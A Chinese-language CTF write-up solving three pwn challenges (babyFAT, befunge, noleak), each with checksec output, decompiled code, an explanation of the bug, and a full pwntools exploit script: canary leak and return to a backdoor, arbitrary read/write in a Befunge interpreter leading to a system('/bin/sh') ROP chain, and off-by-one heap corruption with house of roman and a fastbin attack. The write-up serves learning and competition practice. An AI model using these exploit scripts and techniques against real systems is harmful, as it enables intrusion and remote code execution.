# Lilac 2021 五一欢乐赛

~~假期没人约~~，没事干又不想写作业只能a题了，去年十一的时候第一次做Lilac的题，5天做出一道（太菜了。这次把题AK了，很开心

<!--more-->

# babyFAT

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+7h] [rbp-109h] BYREF
  int v5; // [rsp+8h] [rbp-108h]
  int v6; // [rsp+Ch] [rbp-104h]
  int v7; // [rsp+10h] [rbp-100h]
  int v8; // [rsp+14h] [rbp-FCh]
  int i; // [rsp+18h] [rbp-F8h]
  int v10; // [rsp+1Ch] [rbp-F4h]
  char nptr[16]; // [rsp+20h] [rbp-F0h] BYREF
  char FAT[112]; // [rsp+30h] [rbp-E0h] BYREF
  char string[104]; // [rsp+A0h] [rbp-70h] BYREF
  unsigned __int64 v14; // [rsp+108h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  v6 = 0;
  v7 = v5;
  v10 = 0;
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  hello();
  do
  {
    print_menu();
    __isoc99_scanf(" %c", &v4);
    if ( v4 == 50 )
    {
      for ( i = v5; ; i = FAT[i] )
      {
        putchar(string[i]);
        if ( i == v7 )
          break;
      }
      puts(&byte_400DD8);
    }
    else if ( v4 > 50 )
    {
      if ( v4 == 51 )
      {
        printf("Index: ");
        __isoc99_scanf("%s", nptr);
        v10 = atoi(nptr);
        if ( v6 )
        {
          for ( i = v5; ; i = FAT[i] )
          {
            if ( i == v10 )
            {
              printf("Input content: ");
              __isoc99_scanf(" %c", &string[v10]);
              puts("Success");
              goto LABEL_27;
            }
            if ( i == v7 )
              break;
          }
          puts("Wrong idx!");
        }
      }
      else if ( v4 == 52 )
      {
        v6 = 0;
        memset(FAT, 0, 0x64uLL);
        memset(string, 0, 0x64uLL);
        puts("Success");
      }
    }
    else if ( v4 == 49 )
    {
      if ( v6 <= 99 )
      {
        printf("Index: ");
        __isoc99_scanf("%s", nptr);
        v10 = (int)abs32(atoi(nptr)) % 100;
        printf("Input content: ");
        if ( v6 )
          FAT[v8] = v10;
        else
          v5 = v10;
        v8 = v10;
        ++v6;
        v7 = v10;
        __isoc99_scanf(" %c", &string[v10]);
      }
      else
      {
        puts("full!");
      }
    }
LABEL_27:
    ;
  }
  while ( v4 != 53 );
  puts("Bye~");
  return 0;
}
```

开启了`canary`保护，还有一个后门。在`write`和`edit`的时候使用的`__isoc99_scanf("%s", nptr);`会造成任意长度溢出，但是并不知道`canary`的值。程序本身是一个`File Allocation Table`，通过`FAT[]`数组寻找下一个字符的下标，例如`FAT[1] = 12`那么1之后就要去找12。这里有一个[很棒的视频](https://www.youtube.com/watch?v=V2Gxqv3bJCk)。

我们可以通过溢出覆盖`FAT[0]`的值为一个较大的数，造成数组超界。我们可以通过这个来leak canary。

## exp

```python
from pwn import *
context.log_level="DEBUG"
p = remote("101.200.201.114",30001)

def write(idx,content):
    p.sendlineafter('choice: ','1')
    p.sendlineafter('Index: ',str(idx))
    p.sendline(str(content))

def show():
    p.sendlineafter('choice: ','2')

def edit(idx,content):
    p.sendlineafter('choice: ','3')
    p.sendlineafter('Index: ',str(idx))
    p.sendline(str(content))

## xx xx xx xx xx xx xx 00
## +6 +5 +4 +3 +2 +1 +0 
write(0,'a')
write(1,'a')
payload = p32(0)*4+p8(0x69)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_1 = u8(p.recv(1))
print(hex(bit_1))

payload = p32(0)*4+p8(0x69+1)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_2 = u8(p.recv(1))
print(hex(bit_2))

payload = p32(0)*4+p8(0x69+2)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_3 = u8(p.recv(1))
print(hex(bit_3))

payload = p32(0)*4+p8(0x69+3)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_4 = u8(p.recv(1))
print(hex(bit_4))

payload = p32(0)*4+p8(0x69+4)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_5 = u8(p.recv(1))
print(hex(bit_5))

payload = p32(0)*4+p8(0x69+5)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_6 = u8(p.recv(1))
print(hex(bit_6))

payload = p32(0)*4+p8(0x69+6)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_7 = u8(p.recv(1))
print(hex(bit_7))
canary = +p8(0)+p8(bit_1)+p8(bit_2)+p8(bit_3)+p8(bit_4)+p8(bit_5)+p8(bit_6)+p8(bit_7)
payload = "\x00"*(0xf0-8)+canary+p64(0)+p64(0x04008E7)
write(payload,'a')
#gdb.attach(p)
p.sendlineafter('choice: ','5')

p.interactive()
```

# befunge

## checksc

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

## IDA

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char *v3; // rbp
  unsigned __int64 v4; // rcx
  __int64 i; // rax
  char v6; // di
  char v7; // dl
  __int64 v8; // rdi
  int v9; // eax
  __int64 v10; // r14
  __int64 v11; // rdi
  __int64 v12; // r14
  __int64 v13; // rdi
  __int64 v14; // r14
  __int64 v15; // rdi
  __int64 v16; // r14
  __int64 v17; // rdi
  __int64 v18; // r14
  __int64 v19; // rdi
  __int64 v20; // r14
  __int64 v21; // rax
  __int64 v22; // rax
  __int64 v23; // r14
  __int64 v24; // r15
  __int64 v25; // r14
  __int64 v26; // r14
  __int64 v27; // rax
  __int64 v28; // r15
  __int64 v29; // r14
  int v30; // eax
  int step; // ebx
  int v33; // [rsp+Ch] [rbp-9Ch] BYREF
  char s[80]; // [rsp+10h] [rbp-98h] BYREF
  __int16 v35; // [rsp+60h] [rbp-48h]
  unsigned __int64 v36; // [rsp+68h] [rbp-40h]

  v36 = __readfsqword(0x28u);
  alarm(0x28u);
  __sysv_signal(14, handler);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("Welcome to Online Befunge(93) Interpreter");
  puts("Please input your program.");
  v3 = program;
  do
  {
    __printf_chk(1LL, "> ");
    memset(s, 0, sizeof(s));
    v35 = 0;
    if ( !fgets(s, 82, stdin) )
      break;
    if ( s[0] )
    {
      v4 = strlen(s) + 1;
      if ( *((_BYTE *)&v33 + v4 + 2) == 10 )
        *((_BYTE *)&v33 + v4 + 2) = 0;
    }
    for ( i = 0LL; i != 80; ++i )
      v3[i] = s[i];
    v3 += 80;
  }
  while ( v3 != &program[2000] );
  step = 10001;
  do
  {
    if ( string_mode )
    {
      v6 = program[80 * y_offset + x_offset];
      if ( v6 == 34 )
        string_mode = 0;
      else
        push(v6);
    }
    else if ( bridge <= 0 )
    {
      v7 = program[80 * y_offset + x_offset];
      switch ( v7 )
      {
        case ' ':
          break;
        case '!':
          v22 = pop();
          push(v22 == 0);
          break;
        case '"':
          string_mode = 1;
          break;
        case '#':
          bridge = 1;
          break;
        case '$':
          pop();
          break;
        case '%':
          v18 = pop();
          v19 = pop() % v18;
          push(v19);
          break;
        case '&':
          __isoc99_scanf("%d", &v33);
          push(v33);
          break;
        case '*':
          v14 = pop();
          v15 = v14 * pop();
          push(v15);
          break;
        case '+':
          v10 = pop();
          v11 = pop() + v10;
          push(v11);
          break;
        case ',':
          v9 = pop();
          _IO_putc(v9, stdout);
          break;
        case '-':
          v12 = pop();
          v13 = pop() - v12;
          push(v13);
          break;
        case '.':
          pop();
          __printf_chk(1LL, &off_12F0);
          break;
        case '/':
          v16 = pop();
          v17 = pop() / v16;
          push(v17);
          break;
        case ':':
          v23 = pop();
          push(v23);
          push(v23);
          break;
        case '<':
          move = 2;
          break;
        case '>':
          move = 0;
          break;
        case '@':
          puts("\n");
          puts("Program exited");
          exit(0);
        case '\\':
          v24 = pop();
          v25 = pop();
          push(v24);
          push(v25);
          break;
        case '^':
          move = 3;
          break;
        case '_':
          move = pop() != 0 ? 2 : 0;
          break;
        case '`':
          v20 = pop();
          v21 = pop();
          push(v21 > v20);
          break;
        case 'g':
          v26 = pop();
          v27 = pop();
          push(program[80 * v26 + v27]);
          break;
        case 'p':
          v28 = pop();
          v29 = pop();
          program[80 * v28 + v29] = pop();
          break;
        case 'v':
          move = 1;
          break;
        case '|':
          move = pop() == 0 ? 1 : 3;
          break;
        case '~':
          v8 = _IO_getc(stdin);
          push(v8);
          break;
        default:
          if ( (unsigned __int8)(v7 - 48) <= 9u )
            push(v7 - 48);
          break;
      }
    }
    else
    {
      --bridge;
    }
    y_offset += dword_14E0[move];
    v30 = x_offset + dword_14F0[move];
    x_offset = v30;
    if ( y_offset == -1 )
    {
      y_offset = 24;
    }
    else if ( y_offset == 25 )
    {
      y_offset = 0;
    }
    if ( v30 == -1 )
    {
      x_offset = 79;
    }
    else if ( x_offset == 80 )
    {
      x_offset = 0;
    }
    --step;
  }
  while ( step );
  puts("Too many steps. Is there any infinite loops?");
  return 0LL;
}
```

程序是一个`befunge-93`的解释器，`befunge`的程序布局是一个二维的平面，如下：

```c
      Befunge-93                
      ==========       
   0      x     79                    
  0+-------------+                   
   |                                
   |                            
  y|                  
   |                                    
   |                               
 24+
```

### [Befunge-93 instruction list](https://en.wikipedia.org/wiki/Befunge)

|    `0-9`    |                Push this number on the stack                 |
| :---------: | :----------------------------------------------------------: |
|     `+`     |         Addition: Pop *a* and *b*, then push *a*+*b*         |
|     `-`     |       Subtraction: Pop *a* and *b*, then push *b*-*a*        |
|     `*`     |      Multiplication: Pop *a* and *b*, then push *a***b*      |
|     `/`     | Integer division: Pop *a* and *b*, then push *b*/*a*, rounded towards 0. |
|     `%`     | Modulo: Pop *a* and *b*, then push the remainder of the integer division of *b*/*a*. |
|     `!`     | Logical NOT: Pop a value. If the value is zero, push 1; otherwise, push zero. |
|     ```     | Greater than: Pop *a* and *b*, then push 1 if *b*>*a*, otherwise zero. |
|     `>`     |                      Start moving right                      |
|     `<`     |                      Start moving left                       |
|     `^`     |                       Start moving up                        |
|     `v`     |                      Start moving down                       |
|     `?`     |         Start moving in a random cardinal direction          |
|     `_`     |      Pop a value; move right if value=0, left otherwise      |
|     `|`     |       Pop a value; move down if value=0, up otherwise        |
|     `"`     | Start string mode: push each character's ASCII value all the way up to the next `"` |
|     `:`     |             Duplicate value on top of the stack              |
|     `\`     |             Swap two values on top of the stack              |
|     `$`     |           Pop value from the stack and discard it            |
|     `.`     |    Pop value and output as an integer followed by a space    |
|     `,`     |           Pop value and output as ASCII character            |
|     `#`     |                    Bridge: Skip next cell                    |
|     `p`     | A "put" call (a way to store a value for later use). Pop *y*, *x*, and *v*, then change the character at (*x*,*y*) in the program to the character with ASCII value *v* |
|     `g`     | A "get" call (a way to retrieve data in storage). Pop *y* and *x*, then push ASCII value of the character at that position in the program |
|     `&`     |              Ask user for a number and push it               |
|     `~`     |      Ask user for a character and push its ASCII value       |
|     `@`     |                         End program                          |
| `  `(space) |                     No-op. Does nothing                      |

- 利用`&`，`g`和`,`的功能，我们有办法做到任意读。
  - 先通过&将x跟ypush到Stack上，x与y我们可控（32位整数）
  - 这边注意stack是程序在bss段自行模拟出来的一块，拥有类似的堆栈行为，并不是指程式真正的堆栈。
    `g`的功能是将`program[80 * x + y]`的内容`push`到Stack上。因为x与y我们可控，代表着我们可以将任意位址的内容push到Stack上。
    `,` 弹出stack顶端的值（可控）pop出来（1 byte），并印出他的数值。
 - 利用`&`和`p`的功能，我们还有办法做到任意写
   
    - 先穿透`&`将x，`y`与`z`push到stack上
    
    - p功能会先从堆栈弹出出3个值（x，y，z，均可控），之后将ž的值放入`program[80 * x + y]`（即`program[80 * x + y] = z`）。
- 还有一点要注意
    - 因为通过`&`功能将数值push进栈时，一次只能push一个整数（32位）。如果我们想要使`program[80 * x + y]`跳到很远的地方，x与y很有可能会需要是一个超过`integer`范围的数值，如此一来使用&功能将无法满足我们的需求。
   - 解决方法，利用的`*`功能。`*`会从堆栈弹出顶端两个出数值x与y，并将`x * y`的查询查询结果推回栈上。这里全程是使用64位寄存器进行操作，所以不会有整数32位的问题。
   - 因此，先通过`*`功能将stack顶端变成一个长整数，之后我们就可以利用上面的方法对任意位址做任意读写。

`got`表不可写，我们只能覆盖栈上的返回地址来执行shell。另外，我们还要泄露libc的值。

通过任意地址读，我们将`got`表中某函数的地址leak从而得到libc的基址，接下来，我们通过leak栈地址来覆盖返回地址，[参考博客](https://bamboofox.github.io/write-ups/2016/09/07/MMA-CTF-2nd-2016-Interpreter-200.html)，leak栈地址有以下几种方法(~~繁体就不翻译了，看多了就习惯了~~)：

- **leak stack 上的 saved rbp 或是 argv**。这部分通常是用在 format string 的漏洞，這題無法這樣做。
- **leak tls section 上的 stack address**。這部份比較進階，簡單來說就是程式在執行的時候，會有個 memory 的區塊叫做 tls section，裡面會存許多有用的東西，像是 stack canary, main_arena 的 address, 以及一個不知道指向哪裡的 stack address。而要透過這種方式 leak stack address，我們必須要有辦法知道 tls section 的位址，而這通常需要透過程式先呼叫 mmap，之後 leak mmap 出來的 memory address 來達成。這題因為沒有 malloc 或是 mmap，所以也無法透過這樣的方式來 leak stack address。
- **leak ld-linux.so 的 __libc_stack_end symbol**。如果我們有辦法知道 ld-linux.so 的位址以及版本，我們可以透過 leak 裡面的 `__libc_stack_end` 這個 symbol，來獲取 stack address。這題用這種方式理論上辦的到，我自己就是用這種方式 leak 的，只是做起來非常麻煩。解完這題之後，經詢問別人才發現原來還有第四種方式。
- **leak libc 里面的 environ symbol**。 libc 裡面有個 symbol 叫做 `environ`，裡面會存 stack address。因此這題比較漂亮的方式，是 leak libc 的 address 之後，直接 leak `libc.symbols['environ']` 來獲取 stack address。

我采用了最后一种方式，博客原文采用了第三种绕了一大圈。另外，这题似乎是MMA CTF 2nd 2016的Interpreter 200并非原创题。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
context.terminal = ['tmux', 'splitw', '-h']

binary='./befunge'
#gdb.attach(sh)
if 'g' in sys.argv[1]:
	context.log_level="DEBUG"
if 'l' in sys.argv[1] and 'r' not in sys.argv[1]:
	sh=process(binary)
if 'r' in sys.argv[1]:
	sh=remote('101.200.201.114', 30002)

elf = ELF(binary,checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)

def cal_offset(addr, text_base):
    start_from = text_base + 0x202040
    offset = addr - start_from
    off_80 = offset/80
    off_1 = offset%80

    return off_1, off_80

def write(addr, text_base, value):
    cnt = 0
    off_1, off_80 = cal_offset(addr, text_base)
    temp = int(math.sqrt(off_80))
    off_1 = (off_80 - temp**2)*80 + off_1

    for i in range(off_1, off_1+6):
        v = (value>>(8*cnt)) & 0xff
        sh.sendline(str(v))
        sh.sendline(str(i))
        sh.sendline(str(temp))
        sh.sendline(str(temp))
        cnt += 1

base = 0x202040
program = '>'.ljust(79,' ')+'v'+'\n'
program+= 'v,g&&,g&&,g&&,g&&,g&&,g&&,g&&,g&&,g&&,g&&,g&&,g&&'.ljust(79,' ')+'<'+'\n' #leak libc 6bytes (1st: -2, 2nd: -48 ~ -43) #leak text 6bytes-56, -9
program+= '>&&&*g,&&&*g,&&&*g,&&&*g,&&&*g,&&&*g,'.ljust(79,' ')+'v'+'\n' #leak text 6bytes-56, -9
program+= 'vp*&&&&p*&&&&p*&&&&p*&&&&p*&&&&p*&&&&'.ljust(79,' ')+'<'+'\n'
program+= '>&&&&*p&&&&*p&&&&*p&&&&*p&&&&*p&&&&*p'.ljust(79,' ')+'v'+'\n'
program+= 'vp*&&&&p*&&&&p*&&&&p*&&&&p*&&&&p*&&&&'.ljust(79,' ')+'<'+'\n'
program+= ('v'.ljust(79,' ')+'<'+'\n')*17
program+= '>'.ljust(79,'>')+'v'+'\n'
program+= '^'.ljust(79,'<')+'<'+'\n'
sh.sendlineafter('>',program)
sh.recvuntil("> > > > > > > > > > > > > > > > > > > > > > > > ")

libc_leak = ''
for i in range(6):
    sh.sendline(str((-48)+i))
    sh.sendline(str(-2))
    rev = u8(sh.recv(1))
    libc_leak = libc_leak+p8(rev)
    leak(str(i),rev)
libc_leak = u64(libc_leak.ljust(8,'\x00'))
libcbase = libc_leak-libc.sym['__libc_start_main']
system = libcbase + libc.sym["system"]
env = libcbase + libc.sym['environ']
binsh = libcbase+ libc.search('/bin/sh').next()
leak('libc base',libcbase)
leak('binsh',binsh)

text_leak = ''
for i in range(6):
    sh.sendline(str((-56)+i))
    sh.sendline(str(-9))
    rev = u8(sh.recv(1))
    text_leak = text_leak+p8(rev)
    leak(str(i),rev)
textbase = u64(text_leak.ljust(8,'\x00'))-0xb00 
pop_rdi = textbase + 0x120c
start = base+textbase
leak('text base',textbase)
leak('pop rdi',pop_rdi)

off_1, off_80 = cal_offset(env, textbase)
temp = int(math.sqrt(off_80))
off_1 = (off_80 - temp**2)*80 + off_1
stack_leak = ''
for i in range(off_1,off_1+6):
    sh.sendline(str(i))
    sh.sendline(str(temp))
    sh.sendline(str(temp))
    rev = u8(sh.recv(1))
    stack_leak = stack_leak+p8(rev)
    leak(str(i-off_1),rev)
stack_leak = u64(stack_leak.ljust(8,'\x00'))-0xf0
leak('stack_leak',stack_leak)

write(stack_leak, textbase, pop_rdi)
write(stack_leak+8, textbase, binsh)
write(stack_leak+16, textbase, system)

sh.interactive()
```

# noleak

## check

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**add**

```
__int64 add()
{
  __int64 result; // rax
  int v1; // [rsp+0h] [rbp-10h]
  int nbytes; // [rsp+4h] [rbp-Ch]
  void *nbytes_4; // [rsp+8h] [rbp-8h]

  puts("Input index:");
  v1 = sub_9E0();
  puts("Input size:");
  nbytes = sub_9E0();
  if ( v1 < 0 || v1 > 10 || nbytes < 0 || nbytes > 496 )
  {
    puts("index or size invalid!");
    result = 0xFFFFFFFFLL;
  }
  else
  {
    nbytes_4 = malloc(nbytes);
    puts("Input data:");
    read(0, nbytes_4, (unsigned int)nbytes);
    *((_QWORD *)&unk_2020C0 + 2 * v1) = nbytes_4;
    dword_2020C8[4 * v1] = nbytes;
    result = 0LL;
  }
  return result;
}
```

**dele**

```c
__int64 dele()
{
  __int64 result; // rax
  int v1; // [rsp+Ch] [rbp-4h]

  puts("Input index:");
  v1 = sub_9E0();
  if ( v1 >= 0 && v1 <= 10 && *((_QWORD *)&unk_2020C0 + 2 * v1) )
  {
    free(*((void **)&unk_2020C0 + 2 * v1));
    *((_QWORD *)&unk_2020C0 + 2 * v1) = 0LL;
    dword_2020C8[4 * v1] = 0;
    result = 0LL;
  }
  else
  {
    puts("Index invalid!");
    result = 0xFFFFFFFFLL;
  }
  return result;
}
```

**edit**

```c
__int64 edit()
{
  __int64 result; // rax
  int v1; // [rsp+Ch] [rbp-4h]

  puts("Input index:");
  v1 = sub_9E0();
  if ( v1 >= 0 && v1 <= 10 && *((_QWORD *)&unk_2020C0 + 2 * v1) )
  {
    puts("Input data:");
    sub_A34(*((_QWORD *)&unk_2020C0 + 2 * v1), (unsigned int)dword_2020C8[4 * v1]);
    result = 0LL;
  }
  else
  {
    puts("Index invalid!");
    result = 0xFFFFFFFFLL;
  }
  return result;
}
```

远程环境为16.04漏洞点在`edit`有`off-by-one`，但是要回车跳出循环或者将`size+1`的空间全部填满。

思路还是很简单的，使用`house of roman`来申请`io`leak libc。然后使用`fastbin attack`覆写`__malloc_hook`。

难点在堆的布局，

首先，申请五个chunk，chunk_3是`fastbin victim`大小为0x70，在这个chunk尾部伪造一个0x20大小的chunk，用以后面进行分割，并将其释放掉。

再通过`off-by-one`chunk_0伪造一个`unsorted chunk = chunk_1 + chunk_2 + chunk_3`，这个chunk要包含`fastbin victim`。

`edit`chunk_1将chunk_2的大小设为0x61，free(unsorted chunk)，这时再malloc(0x130)，`unsorted chunk`就会被分割，`unsorted bin`中只留下了chunk_3，而chunk_3在开始被加入了`fastbin`中。

free(chunk_2)，chunk_2被我们修改了大小，其尾部包含了`chunk_3`的头部，所以我们可以覆写其`fd`的低字节使其指向io_file就可以leak libc。

之后就简单的`fastbin attack了。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
context.terminal = ['tmux', 'splitw', '-h']
context.log_level="DEBUG"
binary='./pwn'

#gdb.attach(sh)
elf = ELF(binary,checksec=False)

def add(idx, size, content):
    sh.sendlineafter('choice:', '1')
    sh.sendlineafter('index:', str(idx))
    sh.sendlineafter('size:', str(size))
    sh.sendafter('data:', str(content))

def edit(idx, content):
    sh.sendlineafter('choice:', '3')
    sh.sendlineafter('index:', str(idx))
    sh.sendafter('data:', str(content))

def delete(idx):
    sh.sendlineafter('choice:', '2')
    sh.sendlineafter('index:', str(idx))


for i in range(0x100):
        try:
            sh = process('./pwn')
            # sh = remote("101.200.201.114", 30003)
            add(0, 0xf8, 'a'*8)
            add(1, 0xf8, 'a'*8)
            add(2, 0x30, 'a'*8)
            add(3, 0x60, ('a'*8).ljust(0x18, '\x00') + p64(0x21))
            add(4, 0x100, 'a'*8)

            add(5, 0x68, 'a'*8)
            add(6, 0x30, 'a'*8)
            add(7, 0x60, ('a'*8).ljust(0x18, '\x00') + p64(0x21))
            add(8, 0x60, 'a'*8)
            
            delete(3)
            edit(0, p64(0) * (0xf8 / 8) + '\xb1')
            edit(1, 'a' * 0xf0 + p64(0) + p64(0x61))
            delete(1)

            add(1, 0x130, 'a'*8)
            delete(2)
            add(2, 0x50, 'a' * 0x30 + p64(0) + p64(0x71) + '\xdd\x25')
            add(3, 0x60, 'a'*8)
            add(4, 0x60, 'A'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\x00')
            
            libc = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3c5600
            leak('libc leak',libc)
            delete(7)
            edit(5, 'a' * 0x60 + p64(0) + '\x61')
            delete(6)
            add(6, 0x50, 'a' * 0x30 + p64(0) + p64(0x71) + p64(libc + 0x3c4aed))
            add(7, 0x60, 'a'*8)
            realloc = libc + 0x84710
            payload = 'a' * 0xb + p64(libc + 0x4527a) + p64(realloc + 6)
            add(7, 0x60, payload)
            leak('realloc',realloc)

            sh.interactive()
        except :
            pass
```

